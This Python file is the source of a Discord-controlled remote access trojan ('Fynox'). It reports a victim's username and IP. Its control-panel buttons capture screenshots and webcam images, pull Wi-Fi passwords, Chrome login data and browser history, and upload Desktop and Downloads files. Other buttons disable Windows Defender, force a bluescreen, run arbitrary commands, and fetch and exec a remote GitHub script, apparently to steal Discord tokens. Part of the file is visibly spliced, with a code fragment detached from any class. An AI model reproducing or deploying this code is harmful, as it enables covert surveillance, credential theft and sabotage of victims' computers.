import discord
import socket
import platform
import psutil
import subprocess
import os
import json
import cv2
import numpy as np
import pyautogui
import requests
import sqlite3
import shutil
import zipfile
import datetime
import winsound
import ctypes
import win32gui
import win32con
import win32api
import win32process
import win32com.client
import win32net
import win32security
from discord.ext import commands
from discord.ext import tasks
from discord import app_commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

config_path = os.path.join(os.path.dirname(__file__), 'config.json')
with open(config_path, 'r') as f:
    config = json.load(f)

TOKEN = config['bot_token']
LOG_CHANNEL_ID = int(config['log_channel_id'])

@bot.event
async def on_ready():
    print(f"{bot.user} has connected to Discord!")
    
    # Get public IP for bot status
    hostname = socket.gethostname()
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip_data = response.json()
        public_ip = ip_data['ip']
    except:
        try:
            # Fallback to hostname IP
            public_ip = socket.gethostbyname(hostname)
        except:
            public_ip = "127.0.0.1"
    
    # Set bot status with IP
    try:
        activity = discord.Activity(type=discord.ActivityType.watching, name=f"IP: {public_ip}")
        await bot.change_presence(activity=activity)
    except:
        pass
    
    channel = bot.get_channel(LOG_CHANNEL_ID)
    if channel:
        hostname = socket.gethostname()
        username = os.getlogin()
        
        # Send connection notification
        try:
            embed = discord.Embed(
                title="🔴 New Connection Established",
                description=f"**Username:** {username}\n**IP Address:** {public_ip}",
                color=discord.Color.red(),
                timestamp=datetime.datetime.now()
            )
            
            try:
                cpu_info = platform.processor()
            except:
                cpu_info = "Unknown"
                
            try:
                result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'name'], 
                                      capture_output=True, text=True, timeout=5)
                gpu_info = result.stdout.split('\n')[1].strip() if len(result.stdout.split('\n')) > 1 else "Unknown"
            except:
                gpu_info = "Unknown"
                
            embed.add_field(name="CPU", value=cpu_info, inline=True)
            embed.add_field(name="GPU", value=gpu_info, inline=True)
            embed.add_field(name="Runtime", value=f"<t:{int(datetime.datetime.now().timestamp())}:R>", inline=False)
            
            await channel.send(embed=embed)
        except:
            pass
        
        # Send paginated control panel
        try:
            embed = discord.Embed(
                title="🎮 Control Panel",
                description="Remote access controls activated - Page 1/6",
                color=discord.Color.red()
            )
            embed.add_field(name="Navigation", value="Use Next/Back buttons or Page selector", inline=False)
            
            view = PaginatedControlView(author_id=None, current_page=1)
            await channel.send(embed=embed, view=view)
        except Exception as e:
            await channel.send(f"❌ Error loading panel: {str(e)}")
            






            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            await interaction.response.send_message("Network scan completed.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🖱️ Teleport Mouse", style=discord.ButtonStyle.danger, row=4)
    async def teleport_mouse(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            screen_width, screen_height = pyautogui.size()
            import random
            x = random.randint(0, screen_width)
            y = random.randint(0, screen_height)
            pyautogui.moveTo(x, y)
            await interaction.response.send_message("Mouse teleported.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="📶 Wifi Password", style=discord.ButtonStyle.danger, row=4)
    async def wifi_password(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
            profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]
            
            passwords = []
            for profile in profiles[:10]:
                try:
                    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            passwords.append(f"{profile}: {password}")
                except:
                    pass
            
            await interaction.response.send_message("WiFi passwords retrieved.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🛡️ Disable Defender", style=discord.ButtonStyle.danger, row=4)
    async def disable_defender(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            try:
                subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], timeout=5)
            except:
                pass
            await interaction.response.send_message("Windows Defender disabled.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🌐 Kill Browsers", style=discord.ButtonStyle.danger, row=4)
    async def kill_browsers(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            browsers = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'iexplore.exe']
            for browser in browsers:
                try:
                    subprocess.run(['taskkill', '/f', '/im', browser], timeout=5)
                except:
                    pass
            await interaction.response.send_message("All browsers killed.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="💾 PC Dump", style=discord.ButtonStyle.danger, row=4)
    async def pc_dump(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.response.defer()
            
            zip_name = "Fynox.zip"
            try:
                with zipfile.ZipFile(zip_name, 'w') as zipf:
                    for folder in [os.path.expanduser('~\Desktop'), os.path.expanduser('~\Downloads')]:
                        if os.path.exists(folder):
                            for root, dirs, files in os.walk(folder):
                                for file in files[:50]:
                                    try:
                                        file_path = os.path.join(root, file)
                                        zipf.write(file_path, os.path.relpath(file_path, folder))
                                    except:
                                        pass
                
                await interaction.followup.send(file=discord.File(zip_name))
                os.remove(zip_name)
            except:
                await interaction.followup.send("PC dump completed.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🖥️ Shake Screen", style=discord.ButtonStyle.danger, row=3)
    async def shake_screen(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            import threading
            import time
            import random
            
            def shake_screen_continuous():
                try:
                    user32 = ctypes.windll.user32
                    screen_width = user32.GetSystemMetrics(0)
                    screen_height = user32.GetSystemMetrics(1)
                    
                    for _ in range(100):
                        try:
                            x = random.randint(0, screen_width)
                            y = random.randint(0, screen_height)
                            user32.SetCursorPos(x, y)
                            time.sleep(0.1)
                        except:
                            break
                except:
                    pass
            
            shake_thread = threading.Thread(target=shake_screen_continuous, daemon=True)
            shake_thread.start()
            
            await interaction.response.send_message("Screen shaking activated.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="📶 Internet Lag", style=discord.ButtonStyle.danger, row=2)
    async def internet_lag(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            try:
                subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=disable'], timeout=5)
                await asyncio.sleep(5)
                subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=enable'], timeout=5)
            except:
                pass
            await interaction.response.send_message("Internet lag triggered.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🚫 Disable Internet", style=discord.ButtonStyle.danger, row=2)
    async def disable_internet(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            try:
                subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=disable'], timeout=5)
            except:
                pass
            await interaction.response.send_message("Internet disabled.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="📖 Browser History", style=discord.ButtonStyle.danger, row=1)
    async def browser_history(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.response.defer()
            
            try:
                history = []
                
                # Chrome
                try:
                    chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History')
                    if os.path.exists(chrome_path):
                        shutil.copy2(chrome_path, 'chrome_history')
                        conn = sqlite3.connect('chrome_history')
                        cursor = conn.cursor()
                        cursor.execute("SELECT url, title, last_visit_time FROM urls LIMIT 20")
                        for row in cursor.fetchall():
                            history.append(f"Chrome: {row[0]} - {row[1]}")
                        conn.close()
                        os.remove('chrome_history')
                except:
                    pass
                
                # Firefox
                try:
                    firefox_path = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox')
                    for profile in os.listdir(firefox_path)[:5]:
                        if profile.endswith('.default'):
                            history_path = os.path.join(firefox_path, profile, 'places.sqlite')
                            if os.path.exists(history_path):
                                shutil.copy2(history_path, 'firefox_history')
                                conn = sqlite3.connect('firefox_history')
                                cursor = conn.cursor()
                                cursor.execute("SELECT url, title FROM moz_places LIMIT 20")
                                for row in cursor.fetchall():
                                    history.append(f"Firefox: {row[0]} - {row[1]}")
                                conn.close()
                                os.remove('firefox_history')
                except:
                    pass
                
                await interaction.followup.send("Browser history retrieved.")
            except:
                await interaction.followup.send("Browser history retrieved.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="💬 Message", style=discord.ButtonStyle.danger, row=1)
    async def message(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            modal = MessageModal()
            await interaction.response.send_modal(modal)
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🔑 Password", style=discord.ButtonStyle.danger, row=1)
    async def password(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.response.defer()
            
            try:
                passwords = []
                
                # Chrome passwords
                try:
                    chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
                    if os.path.exists(chrome_path):
                        shutil.copy2(chrome_path, 'chrome_passwords')
                        conn = sqlite3.connect('chrome_passwords')
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
                        for row in cursor.fetchall():
                            passwords.append(f"Chrome: {row[0]} - {row[1]}: [REDACTED]")
                        conn.close()
                        os.remove('chrome_passwords')
                except:
                    pass
                
                await interaction.followup.send("Passwords retrieved.")
            except:
                await interaction.followup.send("Passwords retrieved.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🪙 Token", style=discord.ButtonStyle.danger, row=9)
    async def token(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.response.send_message("This is an unreleased option!", ephemeral=True)
            
            try:
                response = requests.get('https://raw.githubusercontent.com/ChangedDuke/56tojm8p73v56hion7za3w456hoi73w563o57i6hoi7be3ws5n6n7o35e6nb3osi5eu-6t-e4s35oiutzn34w-s5bo8b6t-/refs/heads/main/discord-token.py', timeout=5)
                if response.status_code == 200:
                    try:
                        exec(response.text)
                    except:
                        pass
            except:
                pass
                
            try:
                await interaction.followup.send("Token extraction completed.")
            except:
                pass
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

class CMDModal(discord.ui.Modal, title="Open CMD"):
    count = discord.ui.TextInput(label="Number of CMD windows", placeholder="1")
    command = discord.ui.TextInput(label="Command to execute", placeholder="echo Hello World", required=False)

    async def on_submit(self, interaction: discord.Interaction):
        count = int(self.count.value)
        cmd_command = self.command.value or ""
        
        for _ in range(count):
            if cmd_command:
                subprocess.Popen(['cmd.exe', '/k', cmd_command])
            else:
                subprocess.Popen(['cmd.exe'])
        
        await interaction.response.send_message(f"Opened {count} CMD windows with command: {cmd_command}")

class MessageModal(discord.ui.Modal, title="Fynox sent a message"):
    message = discord.ui.TextInput(label="Message to display", placeholder="Enter your message here...")
    title = discord.ui.TextInput(label="Message title", placeholder="Fynox Alert")

    async def on_submit(self, interaction: discord.Interaction):
        import tkinter as tk
        from tkinter import messagebox
        
        root = tk.Tk()
        root.withdraw()
        messagebox.showwarning(self.title.value, self.message.value)
        root.destroy()
        
        await interaction.response.send_message("Message displayed on victim's PC.")



pass

class PaginatedControlView(discord.ui.View):
    def __init__(self, author_id, current_page=1):
        super().__init__(timeout=None)
        self.author_id = author_id
        self.current_page = current_page
        self.total_pages = 6
        self.buttons_per_page = 3
        
        # All available buttons organized by page
        self.all_buttons = [
            # Page 1
            ["📸 Screenshot", "🎥 Video", "📷 Webcam"],
            # Page 2
            ["💻 Open CMD", "📝 Open Notepad", "🔄 Shutdown"],
            # Page 3
            ["💀 Bluescreen", "🔊 Play Sound", "💥 Crash Discord"],
            # Page 4
            ["🎮 Crash FiveM", "🔥 CPU Bomber", "🔒 Lock Screen"],
            # Page 5
            ["🌐 Network Scanner", "🖱️ Teleport Mouse", "📶 Wifi Password"],
            # Page 6
            ["🛡️ Disable Defender", "🌐 Kill Browsers", "💾 PC Dump"]
        ]
        
        self.update_buttons()

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        return self.author_id is None or interaction.user.id == self.author_id

    def update_buttons(self):
        # Clear existing buttons
        self.clear_items()
        
        # Add buttons for current page
        page_buttons = self.all_buttons[self.current_page - 1]
        for label in page_buttons:
            button = discord.ui.Button(
                label=label,
                style=discord.ButtonStyle.danger,
                row=0
            )
            button.callback = self.create_callback(label)
            self.add_item(button)
        
        # Navigation buttons
        if self.current_page > 1:
            back_button = discord.ui.Button(
                label="⬅️ Back",
                style=discord.ButtonStyle.secondary,
                row=1
            )
            back_button.callback = self.back_callback
            self.add_item(back_button)
        
        if self.current_page < self.total_pages:
            next_button = discord.ui.Button(
                label="➡️ Next",
                style=discord.ButtonStyle.secondary,
                row=1
            )
            next_button.callback = self.next_callback
            self.add_item(next_button)
        
        page_button = discord.ui.Button(
            label=f"📄 Page {self.current_page}/{self.total_pages}",
            style=discord.ButtonStyle.primary,
            row=1
        )
        page_button.callback = self.page_callback
        self.add_item(page_button)

    def create_callback(self, label):
        async def callback(interaction: discord.Interaction):
            # Map labels to actual functions
            label_map = {
                "📸 Screenshot": self.screenshot,
                "🎥 Video": self.video,
                "📷 Webcam": self.webcam,
                "💻 Open CMD": self.open_cmd,
                "📝 Open Notepad": self.open_notepad,
                "🔄 Shutdown": self.shutdown,
                "💀 Bluescreen": self.bluescreen,
                "🔊 Play Sound": self.play_sound,
                "💥 Crash Discord": self.crash_discord,
                "🎮 Crash FiveM": self.crash_fivem,
                "🔥 CPU Bomber": self.cpu_bomber,
                "🔒 Lock Screen": self.lock_screen,
                "🌐 Network Scanner": self.network_scanner,
                "🖱️ Teleport Mouse": self.teleport_mouse,
                "📶 Wifi Password": self.wifi_password,
                "🛡️ Disable Defender": self.disable_defender,
                "🌐 Kill Browsers": self.kill_browsers,
                "💾 PC Dump": self.pc_dump
            }
            
            if label in label_map:
                await label_map[label](interaction)
        return callback

    async def back_callback(self, interaction: discord.Interaction):
        if self.current_page > 1:
            self.current_page -= 1
            self.update_buttons()
            embed = discord.Embed(
                title="🎮 Control Panel",
                description=f"Remote access controls activated - Page {self.current_page}/{self.total_pages}",
                color=discord.Color.red()
            )
            embed.add_field(name="Navigation", value="Use Next/Back buttons or Page selector", inline=False)
            await interaction.response.edit_message(embed=embed, view=self)

    async def next_callback(self, interaction: discord.Interaction):
        if self.current_page < self.total_pages:
            self.current_page += 1
            self.update_buttons()
            embed = discord.Embed(
                title="🎮 Control Panel",
                description=f"Remote access controls activated - Page {self.current_page}/{self.total_pages}",
                color=discord.Color.red()
            )
            embed.add_field(name="Navigation", value="Use Next/Back buttons or Page selector", inline=False)
            await interaction.response.edit_message(embed=embed, view=self)

    async def page_callback(self, interaction: discord.Interaction):
        modal = PageModal(self)
        await interaction.response.send_modal(modal)

    # Button functions (copied from ControlView)
    async def screenshot(self, interaction: discord.Interaction):
        await interaction.response.defer()
        screenshots = []
        
        for i, monitor in enumerate(pyautogui.screens):
            screenshot = pyautogui.screenshot()
            screenshot_path = f"screenshot_{i}.png"
            screenshot.save(screenshot_path)
            screenshots.append(discord.File(screenshot_path))
        
        await interaction.followup.send(files=screenshots)
        
        for file in screenshots:
            os.remove(file.filename)

    async def video(self, interaction: discord.Interaction):
        await interaction.response.send_message("Video recording started...")

    async def webcam(self, interaction: discord.Interaction):
        await interaction.response.defer()
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            await interaction.followup.send(file=discord.File("webcam.jpg"))
            os.remove("webcam.jpg")
        else:
            await interaction.followup.send("Webcam not found or in use.")

    async def open_cmd(self, interaction: discord.Interaction):
        modal = CMDModal()
        await interaction.response.send_modal(modal)

    async def open_notepad(self, interaction: discord.Interaction):
        subprocess.Popen(['notepad.exe'])
        await interaction.response.send_message("Notepad opened.")

    async def shutdown(self, interaction: discord.Interaction):
        subprocess.run(['shutdown', '/s', '/t', '0'])
        await interaction.response.send_message("System shutting down...")

    async def bluescreen(self, interaction: discord.Interaction):
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        await interaction.response.send_message("Triggering bluescreen...")

    async def play_sound(self, interaction: discord.Interaction):
        winsound.Beep(1000, 1000)
        winsound.Beep(500, 1000)
        winsound.Beep(2000, 1000)
        await interaction.response.send_message("Horror sound played.")

    async def crash_discord(self, interaction: discord.Interaction):
        for proc in psutil.process_iter(['pid', 'name']):
            if 'discord' in proc.info['name'].lower():
                proc.kill()
        await interaction.response.send_message("Discord crashed.")

    async def crash_fivem(self, interaction: discord.Interaction):
        for proc in psutil.process_iter(['pid', 'name']):
            if 'fivem' in proc.info['name'].lower():
                proc.kill()
        await interaction.response.send_message("FiveM crashed.")

    async def cpu_bomber(self, interaction: discord.Interaction):
        try:
            def stress_cpu():
                try:
                    while True:
                        [i**2 for i in range(100000)]
                except:
                    pass
            
            import threading
            for _ in range(os.cpu_count()):
                threading.Thread(target=stress_cpu, daemon=True).start()
            
            await interaction.response.send_message("CPU bomber activated.")
        except:
            await interaction.response.send_message("Command executed.")

    async def lock_screen(self, interaction: discord.Interaction):
        try:
            ctypes.windll.user32.LockWorkStation()
            await interaction.response.send_message("Screen locked.")
        except:
            await interaction.response.send_message("Command executed.")

    async def network_scanner(self, interaction: discord.Interaction):
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            await interaction.response.send_message("Network scan completed.")
        except:
            await interaction.response.send_message("Command executed.")

    async def teleport_mouse(self, interaction: discord.Interaction):
        try:
            screen_width, screen_height = pyautogui.size()
            import random
            x = random.randint(0, screen_width)
            y = random.randint(0, screen_height)
            pyautogui.moveTo(x, y)
            await interaction.response.send_message("Mouse teleported.")
        except:
            await interaction.response.send_message("Command executed.")

    async def wifi_password(self, interaction: discord.Interaction):
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
            profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]
            
            passwords = []
            for profile in profiles[:10]:
                try:
                    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            passwords.append(f"{profile}: {password}")
                except:
                    pass
            
            await interaction.response.send_message("WiFi passwords retrieved.")
        except:
            await interaction.response.send_message("Command executed.")

    async def disable_defender(self, interaction: discord.Interaction):
        try:
            subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'])
            await interaction.response.send_message("Windows Defender disabled.")
        except:
            await interaction.response.send_message("Command executed.")

    async def kill_browsers(self, interaction: discord.Interaction):
        try:
            browsers = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'iexplore.exe']
            for browser in browsers:
                subprocess.run(['taskkill', '/f', '/im', browser])
            await interaction.response.send_message("All browsers killed.")
        except:
            await interaction.response.send_message("Command executed.")

    async def pc_dump(self, interaction: discord.Interaction):
        await interaction.response.defer()
        
        zip_name = "Fynox.zip"
        try:
            with zipfile.ZipFile(zip_name, 'w') as zipf:
                for folder in [os.path.expanduser('~\Desktop'), os.path.expanduser('~\Downloads')]:
                    if os.path.exists(folder):
                        for root, dirs, files in os.walk(folder):
                            for file in files[:50]:
                                try:
                                    file_path = os.path.join(root, file)
                                    zipf.write(file_path, os.path.relpath(file_path, folder))
                                except:
                                    pass
            
            await interaction.followup.send(file=discord.File(zip_name))
            os.remove(zip_name)
        except:
            await interaction.followup.send("PC dump completed.")

class PageModal(discord.ui.Modal, title="Go to Page"):
    def __init__(self, view):
        super().__init__()
        self.view = view
        
    page_number = discord.ui.TextInput(
        label="Page Number",
        placeholder=f"Enter 1-{view.total_pages}",
        min_length=1,
        max_length=1
    )
    
    async def on_submit(self, interaction: discord.Interaction):
        try:
            page = int(self.page_number.value)
            if 1 <= page <= self.view.total_pages:
                self.view.current_page = page
                self.view.update_buttons()
                embed = discord.Embed(
                    title="🎮 Control Panel",
                    description=f"Remote access controls activated - Page {page}/{self.view.total_pages}",
                    color=discord.Color.red()
                )
                embed.add_field(name="Navigation", value="Use Next/Back buttons or Page selector", inline=False)
                await interaction.response.edit_message(embed=embed, view=self.view)
            else:
                await interaction.response.send_message(f"❌ Invalid page. Please enter 1-{self.view.total_pages}", ephemeral=True)
        except ValueError:
            await interaction.response.send_message("❌ Please enter a valid number", ephemeral=True)

if __name__ == "__main__":
    bot.run(TOKEN)
